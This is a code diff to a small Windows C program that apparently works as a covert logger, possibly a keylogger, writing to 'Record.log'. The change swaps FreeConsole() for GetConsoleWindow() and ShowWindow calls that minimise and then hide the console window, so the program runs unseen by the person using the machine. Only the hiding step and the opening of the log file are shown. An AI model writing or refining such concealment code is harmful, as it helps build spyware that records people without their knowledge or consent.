@@ -7,6 +7,7 @@
 *        I spent a whole day doing this little code. But it was really fun!
 **/
 
+#define _WIN32_WINNT 0x0500
 #include <stdio.h>
 #include <windows.h>
 #include <time.h>
@@ -15,8 +16,10 @@
 #define FILE_NAME "Record.log"
 
 main(){
-    // hides the console window
-    FreeConsole();
+    
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow( hWnd, SW_MINIMIZE );  //hiding window
+    ShowWindow( hWnd, SW_HIDE );
 
     // open or create a file
     FILE *file = fopen(FILE_NAME, "a");
